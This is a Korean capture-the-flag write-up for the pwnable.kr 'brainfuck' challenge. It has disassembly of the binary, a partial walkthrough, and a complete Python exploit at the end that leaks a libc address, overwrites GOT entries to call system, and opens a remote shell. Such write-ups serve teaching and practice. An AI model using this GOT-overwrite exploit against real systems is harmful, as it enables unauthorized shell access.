## brainfuck

## 문제

> I made a simple brain-fuck language emulation program written in C.  
> The \[ \] commands are not implemented yet. However the rest functionality seems working fine.  
> Find a bug and exploit it to get a shell.
>
> Download : [http://pwnable.kr/bin/bf](http://pwnable.kr/bin/bf)  
> Download : [http://pwnable.kr/bin/bf\_libc.so](http://pwnable.kr/bin/bf_libc.so)
>
> Running at : nc pwnable.kr 9001

## 소스 {#취약점}

문제에서 bf파일이 ELF 파일이고 bf\_libc.so는 동적 라이브러리 파일입니다. 참고하시기 바랍니다.

## 취약점 {#취약점}

* 일반적인 난해한 프로그래밍 언어가 그러하듯 브레인퍽에서도 포인터를 이용한다.
* 소스가 공개되어 있다.

## 힌트 {#힌트}

* [PLT&GOT](/system/plt-and-got.md) 익스플로잇
* netcat를 이용한 스크립트 작성

## 공략 {#공략}

대부분의 공개된 공략법은 영문, 중문으로 되어 있고 또한 파이썬 pwn 라이브러리를 이용하였습니다만 이 공략에서는 pwn 라이브러리를 이용하지 않고 공략하는 방법을 서술하였습니다.

브레인퍽은 &lt;&gt;,.+-\[\]만을 이용한 프로그래밍 언어입니다. 하지만 이 프로그램에서는 \[와 \]가 구현되지 않았다고 합니다. 포인터 p가 unsigned char\*이라고 할때 기능은 다음 표와 같습니다.

| 연산자 | 효과 |
| :---: | :--- |
| &gt; | ++ptr |
| &lt; | --ptr |
| + | ++\*ptr |
| - | --\*ptr |
| . | putchar\(\*ptr\) |
| , | \*ptr=getchar\(\); |

> 이 문제에서 bf파일은 정확히 말하면 C로 구현된 bf 컴파일러라고 봐야 맞습니다. 각 부호마다의 기능은 참조 페이지 혹은 인터넷을 참조해주시기 바랍니다. 매우 심플하기 때문에 배우는 것은 어렵지 않습니다. 다만 쓰기가 힘들뿐이죠.

&gt;&lt; 연산자를 이용해 포인터의 위치를 프로그램 할당 메모리 안에서 자유자제로 움직일 수 있습니다. C 위에서 돌아가는 프로그램이기 때문에 포인터를 조작한다는 것은 매우 강력한 무기임과 동시에 프로그램에서 가장 큰 취약점입니다.

우선 main을 보도록 하죠. gdb로 보셔도 되지만 IDA로 보시면 좀더 명확하게 보실 수 있습니다.

```
.text:08048671                 push    ebp
.text:08048672                 mov     ebp, esp
.text:08048674                 push    ebx
.text:08048675                 and     esp, 0FFFFFFF0h
.text:08048678                 sub     esp, 430h       ; char *
.text:0804867E                 mov     eax, [ebp+arg_4]
.text:08048681                 mov     [esp+434h+var_418], eax
.text:08048685                 mov     eax, large gs:14h
.text:0804868B                 mov     [esp+434h+var_8], eax
.text:08048692                 xor     eax, eax
.text:08048694                 mov     eax, ds:stdout@@GLIBC_2_0
.text:08048699                 mov     [esp+434h+var_428], 0
.text:080486A1                 mov     [esp+434h+var_42C], 2
.text:080486A9                 mov     [esp+434h+var_430], 0
.text:080486B1                 mov     [esp+434h+var_434], eax
.text:080486B4                 call    _setvbuf
.text:080486B9                 mov     eax, ds:stdin@@GLIBC_2_0
.text:080486BE                 mov     [esp+434h+var_428], 0
.text:080486C6                 mov     [esp+434h+var_42C], 1
.text:080486CE                 mov     [esp+434h+var_430], 0
.text:080486D6                 mov     [esp+434h+var_434], eax
.text:080486D9                 call    _setvbuf
.text:080486DE                 mov     ds:p, offset tape
.text:080486E8                 mov     [esp+434h+var_434], offset aWelcomeToBrain ; "welcome to brainfuck testing system!!"
.text:080486EF                 call    _puts
.text:080486F4                 mov     [esp+434h+var_434], offset aTypeSomeBrainf ; "type some brainfuck instructions except"...
.text:080486FB                 call    _puts
.text:08048700                 mov     [esp+434h+var_42C], 400h
.text:08048708                 mov     [esp+434h+var_430], 0
.text:08048710                 lea     eax, [esp+434h+var_408]
.text:08048714                 mov     [esp+434h+var_434], eax
.text:08048717                 call    _memset
.text:0804871C                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048721                 mov     [esp+434h+var_42C], eax
.text:08048725                 mov     [esp+434h+var_430], 400h
.text:0804872D                 lea     eax, [esp+434h+var_408]
.text:08048731                 mov     [esp+434h+var_434], eax
.text:08048734                 call    _fgets
.text:08048739                 mov     [esp+434h+var_40C], 0
.text:08048741                 jmp     short loc_8048760
.text:08048743 ; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴?
.text:08048743
.text:08048743 loc_8048743:                            ; CODE XREF: main+101j
.text:08048743                 lea     edx, [esp+434h+var_408]
.text:08048747                 mov     eax, [esp+434h+var_40C]
.text:0804874B                 add     eax, edx
.text:0804874D                 movzx   eax, byte ptr [eax]
.text:08048750                 movsx   eax, al
.text:08048753                 mov     [esp+434h+var_434], eax
.text:08048756                 call    do_brainfuck
.text:0804875B                 add     [esp+434h+var_40C], 1
.text:08048760
.text:08048760 loc_8048760:                            ; CODE XREF: main+D0j
.text:08048760                 mov     ebx, [esp+434h+var_40C]
.text:08048764                 lea     eax, [esp+434h+var_408]
.text:08048768                 mov     [esp+434h+var_434], eax
.text:0804876B                 call    _strlen
.text:08048770                 cmp     ebx, eax
.text:08048772                 jb      short loc_8048743
.text:08048774                 mov     eax, 0
.text:08048779                 mov     edx, [esp+434h+var_8]
.text:08048780                 xor     edx, large gs:14h
.text:08048787                 jz      short loc_804878E
.text:08048789                 call    ___stack_chk_fail
.text:0804878E
.text:0804878E loc_804878E:                            ; CODE XREF: main+116j
.text:0804878E                 mov     ebx, [ebp+var_4]
.text:08048791                 leave
.text:08048792                 retn
.text:08048792 main            endp
```

필요없는 것들, 모르겠는 것들 빼고 천천히 보다보가   
    .text:080486DE                 mov     ds:p, offset tape  
보아하니 p포인터에 tape 주소를 넣는 것 같네요. 그 밑에는 환영인사를 출력하네요. 좀더 밑으로 내려가면   
    .text:08048717                 call    _memset  
.text:08048717에서 memset을 호출하네요. gdb에서는   
    0x08048717 &lt;+166&gt;:    call   0x80484c0 &lt;memset@plt&gt;  
이렇게 나타내는데 아무래도 IDA에서는 _로 시작하는 함수 호출은 plt를 나타내는 것 같습니다. 여기서는 입력받기 전에 메모리를 초기화 하는가 봅니다. 좀더 내려가보면   
    .text:08048734                 call    _fgets  
가 있습니다. 아무래도 스크립트를 입력받는 것 같죠? 또 읽다보면 유일하게 \_가 붙지 않은 함수 호출을 볼 수 있습니다.

    .text:08048756                 call    do\_brainfuck

함수명을 보아하니 아까 입력받은 fgets 스크립트를 여기서 분석하고 실행하는가 보네요.



## 참고 페이지

* [https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/](https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/)

* [https://namu.wiki/w/BrainFuck](https://namu.wiki/w/BrainFuck)

```python
import nclib
import time
import binascii

nc = nclib.Netcat(("pwnable.kr", 9001))
time.sleep(2)
print(nc.recv())

# bf
p = tape     = 0x0804a0a0
got_fgets    = 0x0804a010
got_memset   = 0x0804a02c

# bf_libc.so
so_fgets    = 0x0005d540
so_system   = 0x0003a920
so_gets     = 0x0005e770
main        = 0x08048671


# script
str=""
# 포인터를 fgets@GOT로 가리킴
str+='<'*(p-got_fgets)
# fgets@GOT 주소 출력
str+='.>'*4
# fgets@GOT 주소 삭제
str+='<'*4
# fgets@GOT 주소를 call system으로 수정
str+=',>'*4
# 포인터를 memset@GOT로 가리킴. memset@GOT - fgets@GOT
str+='<'*4 + '>' * (got_memset - got_fgets)
# memset@GOT 주소를 call fgets로 수정
str+=',>'*4
# putchar@GOT를 main 시작 주소로 수정
str+=',>'*4
# putchar(=main) 호출
str+='.'
# end
str+='\n'
nc.send(str.encode())
time.sleep(1)

# fgets_addr = int(binascii.hexlify(nc.recv()), 16)
addr = nc.recv(4)
fgets_addr = int.from_bytes(addr, byteorder='little')
system_addr = fgets_addr - so_fgets + so_system
gets_addr = fgets_addr - so_fgets + so_gets
print('fgets_addr :', hex(fgets_addr))
print('system_addr :', hex(system_addr))
print('gets_addr :', hex(gets_addr))
print('main_addr :', hex(main))
nc.send(system_addr.to_bytes(4, byteorder='little'))
nc.send(gets_addr.to_bytes(4, byteorder='little'))
nc.send(main.to_bytes(4, byteorder='little'))
nc.send(b'/bin/sh\n')

nc.interact()
```



